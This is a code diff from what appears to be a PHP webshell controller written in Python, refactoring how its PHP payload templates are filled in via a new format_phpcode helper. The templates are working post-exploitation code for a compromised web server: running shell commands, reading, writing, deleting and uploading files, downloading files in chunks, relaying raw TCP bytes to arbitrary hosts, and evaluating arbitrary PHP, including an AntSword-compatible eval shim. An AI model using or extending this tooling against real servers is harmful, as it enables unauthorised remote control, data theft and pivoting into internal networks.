@@ -66,6 +66,9 @@ try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}
 echo '{delimiter_stop}';"""
 )
 
+# 这些php代码中的{xxx}不是python的format string语法而是format_phpcode函数
+# 识别的字符替换关键字，这是为了避免错误替换php代码中代码块的花括号
+
 # TODO: 如果用户提供的命令打印了WRONG_NO_FUNCTION则这里的代码会将正常的输出
 # 当成是发生错误，需要修改输出的字符为随机字符
 
@@ -83,7 +86,7 @@ if(!function_exists("shell_exec")) {
 LIST_DIR_PHP = compress_phpcode_template(
     """
 error_reporting(0);
-$folderPath = DIR_PATH;
+$folderPath = {dir_path};
 $files = scandir($folderPath);
 $result = array();
 foreach ($files as $file) {
@@ -111,7 +114,7 @@ decoder_echo(json_encode($result));
 
 MKDIR_PHP = compress_phpcode_template(
     """
-$path = PATH;
+$path = {dir_path};
 if(!is_dir(dirname($path))){
     decoder_echo("WRONG_NO_PARENT");
 }else if(file_exists($path)) {
@@ -131,14 +134,14 @@ if(!is_dir(dirname($path))){
 
 GET_FILE_CONTENT_PHP = compress_phpcode_template(
     """
-$filePath = FILE_PATH;
+$filePath = {filepath};
 if(!is_file($filePath)) {
     decoder_echo("WRONG_NOT_FILE");
 }
 else if(!is_readable($filePath)) {
     decoder_echo("WRONG_NO_PERMISSION");
 }
-else if(filesize($filePath) > MAX_SIZE) {
+else if(filesize($filePath) > {max_size}) {
     decoder_echo("WRONG_FILE_TOO_LARGE");
 }else {
     $content = file_get_contents($filePath);
@@ -149,8 +152,8 @@ else if(filesize($filePath) > MAX_SIZE) {
 
 PUT_FILE_CONTENT_PHP = compress_phpcode_template(
     """
-$filePath = FILE_PATH;
-$fileContent = base64_decode(FILE_CONTENT);
+$filePath = {filepath};
+$fileContent = base64_decode({file_content});
 if(!is_file($filePath) && !is_writeable(dirname($filePath))) {
     decoder_echo("WRONG_NO_PERMISSION_FOLDER");
 }else if(is_file($filePath) && !is_writeable($filePath)) {
@@ -164,7 +167,7 @@ if(!is_file($filePath) && !is_writeable(dirname($filePath))) {
 
 DELETE_FILE_PHP = compress_phpcode_template(
     """
-$filePath = FILE_PATH;
+$filePath = {filepath};
 if(!is_file($filePath)) {
     decoder_echo("WRONG_NOT_FILE");
 }else if(!is_writable($filePath)) {
@@ -182,8 +185,8 @@ if(!is_file($filePath)) {
 
 MOVE_FILE_PHP = compress_phpcode_template(
     """
-$filePath = #FILEPATH#;
-$newFilePath = #NEW_FILEPATH#;
+$filePath = {filepath};
+$newFilePath = {new_filepath};
 if(!file_exists($filePath)) {
     decoder_echo("WRONG_NOT_EXIST");
 }else if(!is_writeable($filePath)) {
@@ -201,8 +204,8 @@ if(!file_exists($filePath)) {
 
 COPY_FILE_PHP = compress_phpcode_template(
     """
-$filePath = #FILEPATH#;
-$newFilePath = #NEW_FILEPATH#;
+$filePath = {filepath};
+$newFilePath = {new_filepath};
 if(!file_exists($filePath)) {
     decoder_echo("WRONG_NOT_EXIST");
 }else if(!is_writeable($filePath)) {
@@ -220,9 +223,9 @@ if(!file_exists($filePath)) {
 
 UPLOAD_FILE_CHECK_PERMISSION_PHP = compress_phpcode_template(
     """
-if(!is_writable(dirname(FILEPATH))) {
+if(!is_writable(dirname({filepath}))) {
     decoder_echo("WRONG_NO_PERMISSION");
-}else if(file_exists(FILEPATH)) {
+}else if(file_exists({filepath})) {
     decoder_echo("WRONG_FILE_EXISTS");
 }else{
     decoder_echo("OK");
@@ -233,7 +236,7 @@ if(!is_writable(dirname(FILEPATH))) {
 UPLOAD_FILE_CHUNK_PHP = compress_phpcode_template(
     """
 $file = tempnam("", "");
-$content = base64_decode('BASE64_CONTENT');
+$content = base64_decode({base64_content});
 file_put_contents($file, $content);
 decoder_echo($file);
 """
@@ -241,7 +244,7 @@ decoder_echo($file);
 
 UPLOAD_FILE_MERGE_PHP = compress_phpcode_template(
     """
-$files = json_decode(FILES);
+$files = json_decode({files});
 $content = "";
 $readerror = false;
 foreach($files as &$file) {
@@ -253,16 +256,16 @@ foreach($files as &$file) {
     }
     @unlink($file);
 }
-if(file_exists(FILENAME) && !is_writeable(FILENAME)) {
+if(file_exists({filepath}) && !is_writeable({filepath})) {
     decoder_echo("WRONG_NO_PERMISSION");
 }
-else if(!file_exists(FILENAME) && !is_writeable(dirname(FILENAME))) {
+else if(!file_exists({filepath}) && !is_writeable(dirname({filepath}))) {
     decoder_echo("WRONG_NO_PERMISSION_DIR");
 }
 else if($readerror) {
     decoder_echo("WRONG_READ_ERROR");
 }else{
-    file_put_contents(FILENAME, $content);
+    file_put_contents({filepath}, $content);
     decoder_echo("DONE");
 }
 """
@@ -270,28 +273,28 @@ else if($readerror) {
 
 DOWNLOAD_FILE_FILESIZE_PHP = compress_phpcode_template(
     """
-if(!is_file(FILEPATH)) {
+if(!is_file({filepath})) {
     decoder_echo("WRONG_NOT_FILE");
-} else if(!is_readable(FILEPATH)) {
+} else if(!is_readable({filepath})) {
     decoder_echo("WRONG_NO_PERMISSION");
 } else {
-    decoder_echo(json_encode(filesize(FILEPATH)));
+    decoder_echo(json_encode(filesize({filepath})));
 }
 """
 )
 
 DOWNLOAD_FILE_CHUNK_PHP = compress_phpcode_template(
     """
-$file = fopen(FILEPATH, "rb");
-if(!is_file(FILEPATH)) {
+$file = fopen({filepath}, "rb");
+if(!is_file({filepath})) {
     decoder_echo("WRONG_NOT_FILE");
-} else if(!is_readable(FILEPATH)) {
+} else if(!is_readable({filepath})) {
     decoder_echo("WRONG_NO_PERMISSION");
 } else if(!$file) {
     decoder_echo("WRONG_UNKNOWN");
 }else{
-    fseek($file, OFFSET);
-    $content = fread($file, CHUNK_SIZE);
+    fseek($file, {offset});
+    $content = fread($file, {chunk_size});
     fclose($file);
     $md5 = md5($content);
     decoder_echo(base64_encode($content).":".$md5);
@@ -318,7 +321,7 @@ function send_tcp($host, $port, $s)
 if(!function_exists("curl_init")) {
     decoder_echo("WRONG_NOT_SUPPORTED");
 }else{
-    $result = send_tcp(HOST, PORT, base64_decode(CONTENT_B64));
+    $result = send_tcp({host}, {port}, base64_decode({content_b64}));
     if($result === false) {
         decoder_echo("WRONG_SEND_FAILED");
     }else{
@@ -638,6 +641,13 @@ def string_repr(s: str) -> str:
     return f"base64_decode({base64_encode(s)!r})"
 
 
+def format_phpcode(code: str, **kwargs) -> str:
+    """使用kwargs中的值替换code中类似{xxx}的部分，并且忽略不存在的{xxx}"""
+    for key, value in kwargs.items():
+        code = code.replace("{" + key + "}", value)
+    return code
+
+
 def to_sessionize_payload(
     payload: str, chunk: int = PAYLOAD_SESSIONIZE_CHUNK
 ) -> t.List[str]:
@@ -775,7 +785,7 @@ class PHPWebshellActions(PHPSessionInterface):
         # 在执行长时间操作时会导致阻塞其他使用同一个PHPSESSID的操作
         # 所以需要关闭session来避免阻塞
         result = await self.submit(
-            EXECUTE_COMMAND_PHP.replace("{cmd}", string_repr(cmd))
+            format_phpcode(EXECUTE_COMMAND_PHP, cmd=string_repr(cmd))
         )
         if result == "WRONG_NO_FUNCTION":
             raise exceptions.TargetError("目标不支持函数shell_exec")
@@ -783,7 +793,7 @@ class PHPWebshellActions(PHPSessionInterface):
 
     async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
         dir_path = dir_path.removesuffix("/") + "/"
-        php_code = LIST_DIR_PHP.replace("DIR_PATH", string_repr(dir_path))
+        php_code = format_phpcode(LIST_DIR_PHP, dir_path=string_repr(dir_path))
         json_result = await self.submit(php_code)
         try:
             result = json.loads(json_result)
@@ -812,7 +822,9 @@ class PHPWebshellActions(PHPSessionInterface):
         return result
 
     async def mkdir(self, dir_path: str):
-        result = await self.submit(MKDIR_PHP.replace("PATH", string_repr(dir_path)))
+        result = await self.submit(
+            format_phpcode(MKDIR_PHP, dir_path=string_repr(dir_path))
+        )
         if result == "WRONG_NO_PARENT":
             raise exceptions.FileError("上级文件夹不存在")
         if result == "WRONG_EXISTS":
@@ -827,9 +839,11 @@ class PHPWebshellActions(PHPSessionInterface):
     async def get_file_contents(
         self, filepath: str, max_size: int = 1024 * 200
     ) -> bytes:
-        php_code = GET_FILE_CONTENT_PHP.replace(
-            "FILE_PATH", string_repr(filepath)
-        ).replace("MAX_SIZE", str(max_size))
+        php_code = format_phpcode(
+            GET_FILE_CONTENT_PHP,
+            filepath=string_repr(filepath),
+            max_size=str(max_size),
+        )
         result = await self.submit(php_code)
         if result == "WRONG_NOT_FILE":
             raise exceptions.FileError("目标不是一个文件")
@@ -840,9 +854,11 @@ class PHPWebshellActions(PHPSessionInterface):
         return base64.b64decode(result)
 
     async def put_file_contents(self, filepath: str, content: bytes) -> bool:
-        php_code = PUT_FILE_CONTENT_PHP.replace(
-            "FILE_PATH", string_repr(filepath)
-        ).replace("FILE_CONTENT", string_repr(base64_encode(content)))
+        php_code = format_phpcode(
+            PUT_FILE_CONTENT_PHP,
+            filepath=string_repr(filepath),
+            file_content=string_repr(base64_encode(content)),
+        )
         result = await self.submit(php_code)
         if result == "WRONG_NO_PERMISSION_FOLDER":
             raise exceptions.FileError("文件不存在且没有权限向文件夹写入文件")
@@ -853,7 +869,7 @@ class PHPWebshellActions(PHPSessionInterface):
         return result == "SUCCESS"
 
     async def delete_file(self, filepath: str) -> bool:
-        php_code = DELETE_FILE_PHP.replace("FILE_PATH", string_repr(filepath))
+        php_code = format_phpcode(DELETE_FILE_PHP, filepath=string_repr(filepath))
         result = await self.submit(php_code)
         if result == "WRONG_NOT_FILE":
             raise exceptions.FileError("目标不是一个文件")
@@ -862,8 +878,10 @@ class PHPWebshellActions(PHPSessionInterface):
         return result == "SUCCESS"
 
     async def move_file(self, filepath: str, new_filepath: str) -> None:
-        php_code = MOVE_FILE_PHP.replace("#FILEPATH#", string_repr(filepath)).replace(
-            "#NEW_FILEPATH#", string_repr(new_filepath)
+        php_code = format_phpcode(
+            MOVE_FILE_PHP,
+            filepath=string_repr(filepath),
+            new_filepath=string_repr(new_filepath),
         )
         result = await self.submit(php_code)
         if result == "WRONG_NOT_EXIST":
@@ -876,8 +894,10 @@ class PHPWebshellActions(PHPSessionInterface):
             raise exceptions.FileError("文件没有反馈移动成功")
 
     async def copy_file(self, filepath: str, new_filepath: str) -> None:
-        php_code = COPY_FILE_PHP.replace("#FILEPATH#", string_repr(filepath)).replace(
-            "#NEW_FILEPATH#", string_repr(new_filepath)
+        php_code = format_phpcode(
+            COPY_FILE_PHP,
+            filepath=string_repr(filepath),
+            new_filepath=string_repr(new_filepath),
         )
         result = await self.submit(php_code)
         if result == "WRONG_NOT_EXIST":
@@ -900,7 +920,9 @@ class PHPWebshellActions(PHPSessionInterface):
         coros: t.List[t.Awaitable] = []
 
         result = await self.submit(
-            UPLOAD_FILE_CHECK_PERMISSION_PHP.replace("FILEPATH", string_repr(filepath))
+            format_phpcode(
+                UPLOAD_FILE_CHECK_PERMISSION_PHP, filepath=string_repr(filepath)
+            )
         )
         if result == "WRONG_NO_PERMISSION":
             raise exceptions.FileError("没有权限写入文件夹")
@@ -911,7 +933,9 @@ class PHPWebshellActions(PHPSessionInterface):
 
         async def upload_chunk(chunk: bytes):
             nonlocal done_coro, done_bytes
-            code = UPLOAD_FILE_CHUNK_PHP.replace("BASE64_CONTENT", base64_encode(chunk))
+            code = format_phpcode(
+                UPLOAD_FILE_CHUNK_PHP, base64_content=string_repr(base64_encode(chunk))
+            )
             async with sem:
                 await asyncio.sleep(0.01)  # we don't ddos
                 result = await self.submit(code)
@@ -932,9 +956,11 @@ class PHPWebshellActions(PHPSessionInterface):
             for i in range(0, len(content), chunk_size)
         ]
         uploaded_chunks = await asyncio.gather(*coros)
-        code = UPLOAD_FILE_MERGE_PHP.replace(
-            "FILES", string_repr(json.dumps(uploaded_chunks))
-        ).replace("FILENAME", string_repr(filepath))
+        code = format_phpcode(
+            UPLOAD_FILE_MERGE_PHP,
+            files=string_repr(json.dumps(uploaded_chunks)),
+            filepath=string_repr(filepath),
+        )
         result = await self.submit(code)
         if result == "WRONG_NO_PERMISSION":
             raise exceptions.FileError("没有权限写入这个文件")
@@ -947,9 +973,8 @@ class PHPWebshellActions(PHPSessionInterface):
     async def download_file(
         self, filepath: str, callback: t.Union[t.Callable, None] = None
     ) -> bytes:
-
         filesize_text = await self.submit(
-            DOWNLOAD_FILE_FILESIZE_PHP.replace("FILEPATH", string_repr(filepath))
+            format_phpcode(DOWNLOAD_FILE_FILESIZE_PHP, filepath=string_repr(filepath))
         )
         if filesize_text == "WRONG_NOT_FILE":
             raise exceptions.FileError("没有这个文件")
@@ -981,11 +1006,13 @@ class PHPWebshellActions(PHPSessionInterface):
 
         async def download_chunk(offset: int):
             nonlocal done_coro, coros, done_bytes
-            code = (
-                DOWNLOAD_FILE_CHUNK_PHP.replace("FILEPATH", string_repr(filepath))
-                .replace("OFFSET", str(offset))
-                .replace("CHUNK_SIZE", str(chunk_size))
+            code = format_phpcode(
+                DOWNLOAD_FILE_CHUNK_PHP,
+                filepath=string_repr(filepath),
+                offset=str(offset),
+                chunk_size=str(chunk_size),
             )
+
             async with sem:
                 await asyncio.sleep(0.01)  # we don't ddos
                 result = await self.submit(code)
@@ -1039,10 +1066,11 @@ class PHPWebshellActions(PHPSessionInterface):
             template = SEND_BYTES_OVER_TCP_GOPHER_CURL_PHP
         else:
             raise exceptions.UserError(f"找不到TCP发送方法：{repr(send_method)}")
-        code = (
-            template.replace("HOST", string_repr(host))
-            .replace("PORT", str(port))
-            .replace("CONTENT_B64", string_repr(base64_encode(content)))
+        code = format_phpcode(
+            template,
+            host=string_repr(host),
+            port=str(port),
+            content_b64=string_repr(base64_encode(content)),
         )
         result = await self.submit(code)
         if result == "WRONG_NOT_SUPPORTED":
@@ -1097,7 +1125,7 @@ class PHPWebshellActions(PHPSessionInterface):
 
     async def php_eval(self, code: str) -> str:
         result = await self.submit(
-            EVAL_PHP.format(code_b64=string_repr(base64_encode(code)))
+            format_phpcode(EVAL_PHP, code_b64=string_repr(base64_encode(code)))
         )
         return result
 
@@ -1106,11 +1134,14 @@ class PHPWebshellActions(PHPSessionInterface):
         return await self.submit_http(code)
 
     async def emulated_antsword(self, body: bytes) -> t.Tuple[int, str]:
-        code = """
-        parse_str(base64_decode(B64), $_POST);
+        code = format_phpcode(
+            compress_phpcode_template(
+                """
+        parse_str(base64_decode({code_b64}), $_POST);
         eval($_POST['as']);
-        """.replace(
-            "B64", string_repr(base64_encode(body))
+        """
+            ),
+            code_b64=string_repr(base64_encode(body)),
         )
         return await self.submit_http(code)
 
